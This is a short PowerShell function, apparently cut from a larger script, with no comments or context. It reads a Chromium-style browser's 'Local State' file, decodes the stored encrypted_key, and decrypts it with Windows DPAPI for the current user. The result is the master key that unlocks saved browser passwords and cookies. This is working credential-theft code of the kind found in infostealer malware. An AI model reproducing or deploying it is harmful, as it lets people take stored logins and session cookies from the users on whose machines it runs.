function Get-AppKey($appDataSub) {
    $ls = "$env:APPDATA\$appDataSub\Local State"
    if (-not (Test-Path $ls)) { return $null }
    try {
        $j   = Get-Content $ls -Raw | ConvertFrom-Json
        $ek  = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
        $ek  = $ek[5..($ek.Length-1)]
        return [System.Security.Cryptography.ProtectedData]::Unprotect($ek,$null,'CurrentUser')
    } catch { return $null }
}

